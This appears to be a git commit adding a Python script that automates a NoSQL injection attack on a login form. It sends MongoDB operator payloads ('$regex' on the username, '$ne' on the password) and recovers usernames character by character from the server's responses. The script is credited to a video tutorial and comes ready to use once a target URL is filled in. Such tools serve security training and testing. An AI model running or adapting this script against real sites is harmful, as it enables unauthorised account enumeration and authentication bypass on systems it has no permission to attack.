2de6be3517f0e56ea805caaf59d0a3688a3643e2
tp9222 <tp9222@gmail.com>
2023-07-06 23:50:11 +0530

    Create username_extractor.py

---
+++ tools/NoSQLi_data_extractor/username_extractor.py
@@ -0,0 +1,41 @@
+# Ref https://www.youtube.com/watch?v=NO_lsfhQK_s&t=747s
+# thanks to IppSec all credit goes to him  
+import requests
+
+def inject(data):
+    # Send POST request to the specified URL with the provided data
+    # Change URL
+    r = requests.post('http://URL/', data=data, allow_redirects=False)
+    if r.status_code != 200:
+        # If the response status code is not 200, return True indicating injection success
+        return True
+
+
+secret = "" #let say you found first user as admin then put b as first char in secret
+payload = ""
+
+while True:
+    # Chnage parameters
+    # Construct the data payload for the injection attack
+    data = {"username[$regex]":"^" + payload + "$", "password[$ne]":"Ippsec", "login":"login"}
+    if inject(data):
+        # If injection is successful, break out of the loop
+        break
+
+    for i in range(97, 122):
+    # Append the character to the payload without escaping
+        payload = secret + chr(i)
+        print("\r" + payload, flush=False, end='')
+        data = {
+            "username[$regex]":"^" + payload,
+            "password[$ne]":"Ippsec",
+            "login":"login"
+        }
+
+        if inject(data):
+            # If injection is successful, print the payload and update the secret
+            print("\r" + payload, flush=True, end='')
+            secret = secret + chr(i)
+            break
+
+print()
